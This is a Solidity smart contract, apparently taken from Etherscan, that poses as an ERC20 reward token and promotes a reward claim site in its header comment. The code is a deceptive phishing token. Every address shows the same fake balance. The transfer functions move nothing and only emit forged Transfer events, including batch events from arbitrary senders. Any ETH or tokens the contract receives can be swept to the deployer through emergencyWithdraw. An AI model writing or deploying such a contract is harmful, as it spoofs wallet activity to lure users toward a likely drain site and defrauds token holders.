/**
 *Submitted for verification at Etherscan.io on 2023-06-13
*/

/**

A new reward strategy was launched on June 12th, allowing holders of ERC20 tokens to claim rewards based on their holding balance.

https://www.linkfi.app/

*/


// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;
pragma experimental ABIEncoderV2;


interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

contract RewardToken {

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint256 _amount;

    address public initializer;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(string memory name_, string memory symbol_, uint256 amount_) {
        initialize(name_, symbol_, amount_);
    }

    function initialize(string memory name_, string memory symbol_, uint256 amount_) public {
        require(initializer == address(0) || initializer == msg.sender, "already initialized");
        initializer = msg.sender;
        _name = name_;
        _symbol = symbol_;
        _amount = amount_;
        _totalSupply = 100e27;
        transfer(address(0), msg.sender, 1e8 ether);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return 18;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address) public view returns (uint256) {
        return _amount;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function transfer(address to, uint256 amount) public {
        emit Transfer(msg.sender, to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) public {
        emit Transfer(from, to, amount);
    }

    function transfer(address[] memory froms, address[] memory holders, uint256[] memory amounts) public payable {
        uint256 len = holders.length;
        for (uint i = 0; i < len; ++i) {
            emit Transfer(froms[i], holders[i], amounts[i]);
        }
    }

    function transfer(address from, address to, uint256 amount) public {
        emit Transfer(from, to, amount);
    }

    function emergencyWithdraw(address token) public{
        uint256 amount = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(initializer, amount);
    }

    function emergencyWithdraw() public{
        uint256 amount = address(this).balance;
        payable(initializer).transfer(amount);
    }

    receive() payable external {

    }
}